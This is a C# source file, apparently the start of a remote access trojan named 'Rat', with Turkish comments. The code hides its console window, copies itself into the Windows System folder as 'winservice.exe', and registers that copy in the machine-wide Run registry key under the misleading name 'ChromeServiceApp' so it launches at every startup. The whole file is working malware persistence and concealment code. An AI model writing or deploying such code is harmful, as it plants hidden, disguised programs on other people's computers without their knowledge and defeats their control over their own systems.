using System;
using System.IO;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;

namespace Rat
{
    class Program
    {
        // dll import line
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern IntPtr ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);//0 boyutunda console boyutu
            string CP_PATH = Environment.GetFolderPath(Environment.SpecialFolder.System).ToString() + Path.DirectorySeparatorChar + "winservice.exe";
            RegistryKey WinStartUp = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (File.Exists(CP_PATH)) {
                WinStartUp.SetValue("ChromeServiceApp", CP_PATH);
                Environment.Exit(0); }//Birim kontrolü
            else
            {
                string PATH = Path.GetFullPath("Rat.exe");
                File.Copy(PATH, CP_PATH);
                        //Kendini kopyalama.
                        // Fonksiyonel(kopyalanacak) yazılımda izin olmayacak.Ve kopyalamalar ona kaydırılacak.
                WinStartUp.SetValue("ChromeServiceApp", CP_PATH);
                
            }
            
        }
    }
}
